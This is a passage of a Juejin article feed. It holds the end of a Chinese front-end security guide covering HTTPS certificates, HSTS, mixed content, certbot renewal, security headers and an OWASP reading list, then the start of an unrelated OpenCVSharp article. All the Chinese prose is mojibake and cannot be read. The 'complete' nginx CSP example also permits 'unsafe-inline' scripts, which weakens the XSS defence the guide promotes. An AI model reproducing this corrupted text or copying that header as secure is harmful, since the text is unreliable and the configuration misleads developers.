<p><strong>è¯ä¹¦åŒ…å«</strong>ï¼š</p>
<ul>
<li>æœåŠ¡å™¨å…¬é’¥</li>
<li>åŸŸåä¿¡æ¯</li>
<li>è¯ä¹¦é¢å‘æœºæ„ï¼ˆCAï¼‰çš„æ•°å­—ç­¾å</li>
</ul>
</li>
<li>
<p><strong>éªŒè¯æµç¨‹</strong>ï¼š</p>
<ul>
<li>æµè§ˆå™¨ç”¨ CA çš„å…¬é’¥éªŒè¯æ•°å­—ç­¾å</li>
<li>CA çš„å…¬é’¥å†…ç½®åœ¨æ“ä½œç³»ç»Ÿ/æµè§ˆå™¨ä¸­</li>
<li>å¦‚æœç­¾åéªŒè¯å¤±è´¥ï¼Œè¯´æ˜è¯ä¹¦è¢«ç¯¡æ”¹</li>
</ul>
</li>
<li>
<p><strong>ä¿¡ä»»é“¾</strong>ï¼š</p>
<ul>
<li>æ ¹ CAï¼ˆå—ä¿¡ä»»çš„æƒå¨æœºæ„ï¼‰</li>
<li>ä¸­é—´ CA</li>
<li>æœåŠ¡å™¨è¯ä¹¦</li>
</ul>
</li>
</ol>
<p>ä¸­é—´äººå³ä½¿æ‹¦æˆªå¹¶æ›¿æ¢è¯ä¹¦ï¼Œä¹Ÿæ— æ³•ä¼ªé€  CA çš„ç­¾åï¼Œæµè§ˆå™¨ä¼šæŠ¥è­¦å‘Šã€‚</p>
<h3 data-id="heading-24">å‰ç«¯è¦æ³¨æ„çš„</h3>
<p><strong>1. å¼ºåˆ¶ HTTPS</strong></p>
<p>é…ç½®é‡å®šå‘ï¼ŒHTTP è‡ªåŠ¨è·³ HTTPSï¼š</p>
<pre><code class="hljs language-nginx" lang="nginx">server {
  listen 80;
  server_name example.com;
  return 301 https://$server_name$request_uri;
}

server {
  listen 443 ssl http2;
  server_name example.com;

  ssl_certificate /path/to/cert.pem;
  ssl_certificate_key /path/to/key.pem;

  # ç°ä»£ SSL é…ç½®
  ssl_protocols TLSv1.2 TLSv1.3;
  ssl_ciphers HIGH:!aNULL:!MD5;
  ssl_prefer_server_ciphers on;
}
</code></pre>
<p><strong>2. HSTSï¼ˆHTTP Strict Transport Securityï¼‰</strong></p>
<p>å‘Šè¯‰æµè§ˆå™¨ä»¥ååªç”¨ HTTPS è®¿é—®ï¼š</p>
<pre><code class="hljs language-ini" lang="ini">Strict-Transport-Security: <span class="hljs-attr">max-age</span>=<span class="hljs-number">31536000</span><span class="hljs-comment">; includeSubDomains; preload</span>
</code></pre>
<ul>
<li><code>max-age=31536000</code>ï¼š1 å¹´å†…å¼ºåˆ¶ HTTPS</li>
<li><code>includeSubDomains</code>ï¼šåŒ…æ‹¬æ‰€æœ‰å­åŸŸå</li>
<li><code>preload</code>ï¼šåŠ å…¥æµè§ˆå™¨é¢„åŠ è½½åˆ—è¡¨ï¼ˆå» hstspreload.org æäº¤ï¼‰</li>
</ul>
<p>è®¾ç½® HSTS åï¼Œå³ä½¿ç”¨æˆ·è¾“å…¥ <code>http://example.com</code>ï¼Œæµè§ˆå™¨ä¹Ÿä¼šè‡ªåŠ¨æ”¹æˆ <code>https://</code>ã€‚</p>
<p><strong>3. é¿å…æ··åˆå†…å®¹ï¼ˆMixed Contentï¼‰</strong></p>
<p>HTTPS é¡µé¢é‡Œä¸è¦åŠ è½½ HTTP èµ„æºï¼Œå¦åˆ™æµè§ˆå™¨ä¼šè­¦å‘Šæˆ–é˜»æ­¢ï¼š</p>
<pre><code class="hljs language-html" lang="html"><span class="hljs-comment">&lt;!-- å±é™© --&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">script</span> <span class="hljs-attr">src</span>=<span class="hljs-string">"http://example.com/script.js"</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">img</span> <span class="hljs-attr">src</span>=<span class="hljs-string">"http://cdn.example.com/image.jpg"</span>&gt;</span>

<span class="hljs-comment">&lt;!-- å®‰å…¨ --&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">script</span> <span class="hljs-attr">src</span>=<span class="hljs-string">"https://example.com/script.js"</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">img</span> <span class="hljs-attr">src</span>=<span class="hljs-string">"https://cdn.example.com/image.jpg"</span>&gt;</span>

<span class="hljs-comment">&lt;!-- åè®®ç›¸å¯¹è·¯å¾„ï¼ˆè‡ªåŠ¨åŒ¹é…å½“å‰é¡µé¢åè®®ï¼‰ --&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">script</span> <span class="hljs-attr">src</span>=<span class="hljs-string">"//example.com/script.js"</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span>
</code></pre>
<p>æ£€æŸ¥æ··åˆå†…å®¹ï¼š</p>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-comment">// æ£€æµ‹é¡µé¢æ˜¯å¦æœ‰æ··åˆå†…å®¹</span>
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-variable language_">document</span>.<span class="hljs-property">URL</span>.<span class="hljs-title function_">startsWith</span>(<span class="hljs-string">'https'</span>));

<span class="hljs-comment">// ç›‘å¬æ··åˆå†…å®¹è­¦å‘Š</span>
<span class="hljs-variable language_">window</span>.<span class="hljs-title function_">addEventListener</span>(<span class="hljs-string">'securitypolicyviolation'</span>, <span class="hljs-function">(<span class="hljs-params">e</span>) =&gt;</span> {
  <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">warn</span>(<span class="hljs-string">'Mixed content:'</span>, e);
});
</code></pre>
<p><strong>4. è¯ä¹¦æœ‰æ•ˆæœŸ</strong></p>
<p>è®°å¾—ç»­æœŸè¯ä¹¦ã€‚å¯ä»¥ç”¨ Let's Encrypt å…è´¹è¯ä¹¦ï¼Œé…åˆ certbot è‡ªåŠ¨ç»­æœŸï¼š</p>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-comment"># å®‰è£… certbot</span>
apt-get install certbot python3-certbot-nginx

<span class="hljs-comment"># è·å–è¯ä¹¦</span>
certbot --nginx -d example.com

<span class="hljs-comment"># è‡ªåŠ¨ç»­æœŸï¼ˆcron jobï¼‰</span>
0 0 * * * certbot renew --quiet
</code></pre>
<hr/>
<h2 data-id="heading-25">å®‰å…¨ HTTP å“åº”å¤´æ¸…å•</h2>
<p>é™¤äº†å‰é¢æåˆ°çš„ CSPã€X-Frame-Optionsã€HSTSï¼Œè¿˜æœ‰å‡ ä¸ªé‡è¦çš„å®‰å…¨å¤´ï¼š</p>
<h3 data-id="heading-26">1. X-Content-Type-Options</h3>
<p>ç¦æ­¢æµè§ˆå™¨ MIME ç±»å‹å—…æ¢ï¼š</p>
<pre><code class="hljs language-css" lang="css">X-<span class="hljs-attribute">Content</span>-Type-Options: nosniff
</code></pre>
<p>é˜²æ­¢æµè§ˆå™¨æŠŠ <code>text/plain</code> æ–‡ä»¶å½“ JavaScript æ‰§è¡Œã€‚</p>
<h3 data-id="heading-27">2. Referrer-Policy</h3>
<p>æ§åˆ¶ Referer å¤´æ³„éœ²å¤šå°‘ä¿¡æ¯ï¼š</p>
<pre><code class="hljs language-sql" lang="sql">Referrer<span class="hljs-operator">-</span>Policy: strict<span class="hljs-operator">-</span>origin<span class="hljs-operator">-</span><span class="hljs-keyword">when</span><span class="hljs-operator">-</span><span class="hljs-keyword">cross</span><span class="hljs-operator">-</span>origin
</code></pre>
<p>å¯é€‰å€¼ï¼š</p>
<ul>
<li><code>no-referrer</code>ï¼šä¸å‘é€</li>
<li><code>no-referrer-when-downgrade</code>ï¼šHTTPSâ†’HTTP ä¸å‘é€</li>
<li><code>origin</code>ï¼šåªå‘é€åŸŸå</li>
<li><code>strict-origin-when-cross-origin</code>ï¼šè·¨åŸŸåªå‘é€åŸŸåï¼ˆæ¨èï¼‰</li>
</ul>
<h3 data-id="heading-28">3. Permissions-Policy</h3>
<p>é™åˆ¶æµè§ˆå™¨åŠŸèƒ½ï¼ˆåŸ Feature-Policyï¼‰ï¼š</p>
<pre><code class="hljs language-ini" lang="ini">Permissions-Policy: <span class="hljs-attr">geolocation</span>=(), microphone=(), camera=(), payment=()
</code></pre>
<p>ç¦æ­¢é¡µé¢è®¿é—®æ‘„åƒå¤´ã€éº¦å…‹é£ã€åœ°ç†ä½ç½®ç­‰ã€‚</p>
<h3 data-id="heading-29">4. X-XSS-Protectionï¼ˆå·²è¿‡æ—¶ï¼‰</h3>
<pre><code class="hljs language-makefile" lang="makefile"><span class="hljs-section">X-XSS-Protection: 0</span>
</code></pre>
<p>è¿™ä¸ªå¤´å·²ç»è¿‡æ—¶äº†ï¼Œç°ä»£æµè§ˆå™¨ä¸å†æ¨èä½¿ç”¨ã€‚ç”¨ CSP ä»£æ›¿ã€‚</p>
<h3 data-id="heading-30">å®Œæ•´é…ç½®ç¤ºä¾‹</h3>
<pre><code class="hljs language-nginx" lang="nginx"># Nginx é…ç½®
add_header Strict-Transport-Security "max-age=31536000; includeSubDomains; preload" always;
add_header X-Content-Type-Options "nosniff" always;
add_header X-Frame-Options "SAMEORIGIN" always;
add_header Referrer-Policy "strict-origin-when-cross-origin" always;
add_header Permissions-Policy "geolocation=(), microphone=(), camera=()" always;
add_header Content-Security-Policy "default-src 'self'; script-src 'self' 'unsafe-inline'; style-src 'self' 'unsafe-inline'; img-src 'self' data: https:; font-src 'self'; connect-src 'self'; frame-ancestors 'self'" always;
</code></pre>
<h3 data-id="heading-31">æ£€æµ‹å·¥å…·</h3>
<p>ç”¨ <a href="https://link.juejin.cn?target=https%3A%2F%2Fsecurityheaders.com" target="_blank" title="https://securityheaders.com" ref="nofollow noopener noreferrer">securityheaders.com</a> æ£€æµ‹ä½ çš„ç½‘ç«™ç¼ºå°‘å“ªäº›å®‰å…¨å¤´ï¼Œä¼šç»™å‡ºè¯„åˆ†å’Œæ”¹è¿›å»ºè®®ã€‚</p>
<hr/>
<h2 data-id="heading-32">å°ç»“</h2>
<pre><code class="hljs language-mermaid" lang="mermaid">mindmap
  root((å‰ç«¯å®‰å…¨))
    è¾“å…¥å®‰å…¨
      XSSé˜²å¾¡
        è½¬ä¹‰è¾“å‡º
        textContent
        DOMPurify
        CSP
      éªŒè¯è¿‡æ»¤
    è¯·æ±‚å®‰å…¨
      CSRFé˜²å¾¡
        Token
        SameSite Cookie
      CORSé…ç½®
        ç™½åå•
        é™åˆ¶æ–¹æ³•
    ä¼ è¾“å®‰å…¨
      HTTPS
      HSTS
      è¯ä¹¦ç®¡ç†
    å­˜å‚¨å®‰å…¨
      HttpOnly Cookie
      é¿å…localStorageå­˜æ•æ„Ÿæ•°æ®
    ä¾èµ–å®‰å…¨
      ç‰ˆæœ¬é”å®š
      npm audit
      ç§æœ‰æº
</code></pre>
<p>å‰ç«¯å®‰å…¨çš„æ ¸å¿ƒæ€è·¯ï¼š</p>
<ol>
<li><strong>ä¸ä¿¡ä»»ä»»ä½•è¾“å…¥</strong>ï¼šç”¨æˆ·è¾“å…¥ã€URL å‚æ•°ã€ç¬¬ä¸‰æ–¹æ•°æ®ï¼Œéƒ½è¦éªŒè¯å’Œè½¬ä¹‰</li>
<li><strong>æœ€å°æƒé™åŸåˆ™</strong>ï¼šCookie è®¾ç½® HttpOnlyã€Secureã€SameSiteï¼›CSP é™åˆ¶èµ„æºåŠ è½½ï¼›CORS ç™½åå•</li>
<li><strong>çºµæ·±é˜²å¾¡</strong>ï¼šä¸è¦ä¾èµ–å•ä¸€é˜²æŠ¤æ‰‹æ®µï¼Œå¤šå±‚é˜²æŠ¤å åŠ </li>
<li><strong>ä¿æŒæ›´æ–°</strong>ï¼šä¾èµ–ç‰ˆæœ¬ã€å®‰å…¨è¡¥ä¸ã€æµè§ˆå™¨æ–°ç‰¹æ€§</li>
</ol>
<p>å…·ä½“æªæ–½é€ŸæŸ¥ï¼š</p>
<ul>
<li><strong>XSS é˜²å¾¡</strong>ï¼šç”¨ <code>textContent</code>ã€è½¬ä¹‰ HTMLã€DOMPurifyã€HttpOnly Cookieã€CSP</li>
<li><strong>CSRF é˜²å¾¡</strong>ï¼šCSRF Tokenã€SameSite Cookieã€éªŒè¯è¯·æ±‚æ¥æº</li>
<li><strong>ç‚¹å‡»åŠ«æŒé˜²å¾¡</strong>ï¼šX-Frame-Optionsã€CSP frame-ancestorsã€SameSite Cookie</li>
<li><strong>CORS å®‰å…¨</strong>ï¼šç™½åå•éªŒè¯ Originï¼Œä¸åŠ¨æ€åå°„ï¼Œé™åˆ¶æ–¹æ³•å’Œå¤´</li>
<li><strong>ä¾èµ–å®‰å…¨</strong>ï¼šé”å®šç‰ˆæœ¬ã€npm ciã€å®šæœŸå®¡è®¡ã€ç¦ç”¨è„šæœ¬ã€ç§æœ‰æºã€å‡å°‘ä¾èµ–</li>
<li><strong>å­˜å‚¨å®‰å…¨</strong>ï¼šä¸å­˜æ•æ„Ÿæ•°æ®åˆ° localStorageï¼Œç”¨ HttpOnly Cookieï¼Œå®ç°è¿‡æœŸæœºåˆ¶</li>
<li><strong>ä¼ è¾“å®‰å…¨</strong>ï¼šå¼ºåˆ¶ HTTPSã€HSTSã€é¿å…æ··åˆå†…å®¹ã€Let's Encrypt è‡ªåŠ¨ç»­æœŸ</li>
<li><strong>HTTP å¤´</strong>ï¼šCSPã€X-Frame-Optionsã€HSTSã€X-Content-Type-Optionsã€Referrer-Policyã€Permissions-Policy</li>
</ul>
<p>å®‰å…¨æ˜¯ä¸ªæŒç»­çš„è¿‡ç¨‹ï¼Œä¸æ˜¯ä¸€åŠ³æ°¸é€¸çš„äº‹ã€‚å®šæœŸå®¡è®¡ä»£ç ã€æ›´æ–°ä¾èµ–ã€å…³æ³¨å®‰å…¨å…¬å‘Šï¼Œæ‰èƒ½æŒç»­ä¿éšœç³»ç»Ÿå®‰å…¨ã€‚</p>
<hr/>
<p>å†™è¿™ç¯‡æ–‡ç« çš„æ—¶å€™ï¼Œä»£ç ç¤ºä¾‹éƒ½ç”¨ <a href="https://link.juejin.cn?target=https%3A%2F%2Fgithub.com%2Ftt-a1i%2Fcode-review-skill" target="_blank" title="https://github.com/tt-a1i/code-review-skill" ref="nofollow noopener noreferrer">code-review-skill</a> è¿‡äº†ä¸€éã€‚è¿™æ˜¯æˆ‘å†™çš„ Claude Code ä»£ç å®¡æŸ¥æŠ€èƒ½ï¼Œèƒ½è‡ªåŠ¨æ£€æµ‹è¿™ç¯‡æ–‡ç« é‡Œæåˆ°çš„ XSSã€CSRFã€ä¸å®‰å…¨çš„ localStorage ä½¿ç”¨è¿™äº›é—®é¢˜ã€‚</p>
<p>ä¸»è¦åŠŸèƒ½ï¼š</p>
<ul>
<li><strong>å®‰å…¨æ¼æ´æ£€æµ‹</strong>ï¼šXSSã€CSRFã€æ³¨å…¥æ”»å‡»ã€æ•æ„Ÿæ•°æ®æš´éœ²</li>
<li><strong>æ¡†æ¶é€‚é…</strong>ï¼šReactã€Vueã€TypeScriptã€Node.js éƒ½èƒ½ç”¨</li>
<li><strong>æœ€ä½³å®è·µæ£€æŸ¥</strong>ï¼šä»£ç è§„èŒƒã€æ€§èƒ½é—®é¢˜ã€å¯ç»´æŠ¤æ€§</li>
</ul>
<p>ç”¨ Claude Code çš„è¯ç›´æ¥è£…ä¸Šå°±èƒ½ç”¨ï¼Œreview ä»£ç çš„æ—¶å€™çœä¸å°‘äº‹ã€‚ä»“åº“é‡Œæœ‰è¯¦ç»†çš„å®‰è£…è¯´æ˜å’Œä½¿ç”¨ç¤ºä¾‹ã€‚</p>
<p><strong>GitHub</strong>ï¼š<a href="https://link.juejin.cn?target=https%3A%2F%2Fgithub.com%2Ftt-a1i%2Fcode-review-skill" target="_blank" title="https://github.com/tt-a1i/code-review-skill" ref="nofollow noopener noreferrer">tt-a1i/code-review-skill</a></p>
<p>è§‰å¾—æœ‰ç”¨çš„è¯ç»™ä¸ª starï¼Œæœ‰é—®é¢˜æ¬¢è¿æ issueã€‚</p>
<hr/>
<h2 data-id="heading-33">å‚è€ƒèµ„æ–™</h2>
<ul>
<li><a href="https://link.juejin.cn?target=https%3A%2F%2Fowasp.org%2FTop10%2F2025%2F0x00_2025-Introduction%2F" target="_blank" title="https://owasp.org/Top10/2025/0x00_2025-Introduction/" ref="nofollow noopener noreferrer">OWASP Top 10:2025</a></li>
<li><a href="https://link.juejin.cn?target=https%3A%2F%2Fcheatsheetseries.owasp.org%2Fcheatsheets%2FCross_Site_Scripting_Prevention_Cheat_Sheet.html" target="_blank" title="https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html" ref="nofollow noopener noreferrer">OWASP XSS Prevention Cheat Sheet</a></li>
<li><a href="https://link.juejin.cn?target=https%3A%2F%2Fcheatsheetseries.owasp.org%2Fcheatsheets%2FCross-Site_Request_Forgery_Prevention_Cheat_Sheet.html" target="_blank" title="https://cheatsheetseries.owasp.org/cheatsheets/Cross-Site_Request_Forgery_Prevention_Cheat_Sheet.html" ref="nofollow noopener noreferrer">OWASP CSRF Prevention Cheat Sheet</a></li>
<li><a href="https://link.juejin.cn?target=https%3A%2F%2Fdeveloper.mozilla.org%2Fen-US%2Fdocs%2FWeb%2FHTTP%2FGuides%2FCSP" target="_blank" title="https://developer.mozilla.org/en-US/docs/Web/HTTP/Guides/CSP" ref="nofollow noopener noreferrer">Content Security Policy - MDN</a></li>
<li><a href="https://link.juejin.cn?target=https%3A%2F%2Fcheatsheetseries.owasp.org%2Fcheatsheets%2FContent_Security_Policy_Cheat_Sheet.html" target="_blank" title="https://cheatsheetseries.owasp.org/cheatsheets/Content_Security_Policy_Cheat_Sheet.html" ref="nofollow noopener noreferrer">OWASP CSP Cheat Sheet</a></li>
<li><a href="https://link.juejin.cn?target=https%3A%2F%2Fdeveloper.mozilla.org%2Fen-US%2Fdocs%2FWeb%2FSecurity%2FPractical_implementation_guides%2FCSRF_prevention" target="_blank" title="https://developer.mozilla.org/en-US/docs/Web/Security/Practical_implementation_guides/CSRF_prevention" ref="nofollow noopener noreferrer">MDN - CSRF Prevention</a></li>
<li><a href="https://link.juejin.cn?target=https%3A%2F%2Fdeveloper.mozilla.org%2Fen-US%2Fdocs%2FWeb%2FSecurity%2FPractical_implementation_guides%2FClickjacking" target="_blank" title="https://developer.mozilla.org/en-US/docs/Web/Security/Practical_implementation_guides/Clickjacking" ref="nofollow noopener noreferrer">MDN - Clickjacking Prevention</a></li>
<li><a href="https://link.juejin.cn?target=https%3A%2F%2Fportswigger.net%2Fweb-security%2Fcors" target="_blank" title="https://portswigger.net/web-security/cors" ref="nofollow noopener noreferrer">PortSwigger - CORS Security</a></li>
<li><a href="https://link.juejin.cn?target=https%3A%2F%2Fzhuanlan.zhihu.com%2Fp%2F599242750" target="_blank" title="https://zhuanlan.zhihu.com/p/599242750" ref="nofollow noopener noreferrer">npm å®‰å…¨ï¼šé˜²æ­¢ä¾›åº”é“¾æ”»å‡»</a></li>
<li><a href="https://link.juejin.cn?target=https%3A%2F%2Fwww.ruanyifeng.com%2Fblog%2F2019%2F09%2Fcookie-samesite.html" target="_blank" title="https://www.ruanyifeng.com/blog/2019/09/cookie-samesite.html" ref="nofollow noopener noreferrer">SameSite Cookie å±æ€§</a></li>
<li><a href="https://link.juejin.cn?target=https%3A%2F%2Fwww.wosign.com%2FNews%2Fhttpsjiami_20180817.htm" target="_blank" title="https://www.wosign.com/News/httpsjiami_20180817.htm" ref="nofollow noopener noreferrer">HTTPS åŠ å¯†åŸç†</a></li>
<li><a href="https://link.juejin.cn?target=https%3A%2F%2Fblog.csdn.net%2Fexlink2012%2Farticle%2Fdetails%2F147940289" target="_blank" title="https://blog.csdn.net/exlink2012/article/details/147940289" ref="nofollow noopener noreferrer">å‰ç«¯å®‰å…¨ï¼šXSSã€CSRF é˜²å¾¡ä¸æœ€ä½³å®è·µ</a></li>
</ul></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[OpenCVSharpï¼šäº†è§£å‡ ç§ç‰¹å¾æ£€æµ‹]]></title>    <link>https://juejin.cn/post/7583973472324108303</link>    <guid>https://juejin.cn/post/7583973472324108303</guid>    <pubDate>2025-12-16T06:51:19.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7583973472324108303" data-draft-id="7583973472324091919" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="OpenCVSharpï¼šäº†è§£å‡ ç§ç‰¹å¾æ£€æµ‹ "/> <meta itemprop="keywords" content="åç«¯"/> <meta itemprop="datePublished" content="2025-12-16T06:51:19.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="Javaç¼–ç¨‹çˆ±å¥½è€…"/> <meta itemprop="url" content="https://juejin.cn/user/819554264300154"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            OpenCVSharpï¼šäº†è§£å‡ ç§ç‰¹å¾æ£€æµ‹ 
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/819554264300154/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    Javaç¼–ç¨‹çˆ±å¥½è€…
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2025-12-16T06:51:19.000Z" title="Tue Dec 16 2025 06:51:19 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2025-12-16
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»9åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><h2 data-id="heading-0">å‰è¨€</h2>
<p>å‰é¢å·²ç»ä»‹ç»è¿‡äº†OpenCVSharpä¸­å°è£…çš„å‡ ä¸ªç‰¹å¾æ£€æµ‹ç®—æ³•ï¼Œå…¶å®é‡Œé¢è¿˜æœ‰å¾ˆå¤šç‰¹å¾æ£€æµ‹ç®—æ³•ï¼Œä¸å†ä¸€ç¯‡ä¸€ç¯‡åœ°ä»‹ç»äº†ï¼Œå…¶å®ƒçš„éƒ½æ”¾åœ¨è¿™ä¸€ç¯‡ï¼Œç®€å•è¿‡ä¸€ä¸‹ï¼Œæœ‰ç‚¹å°è±¡å³å¯ã€‚</p>
<h2 data-id="heading-1">FASTç‰¹å¾æ£€æµ‹</h2>
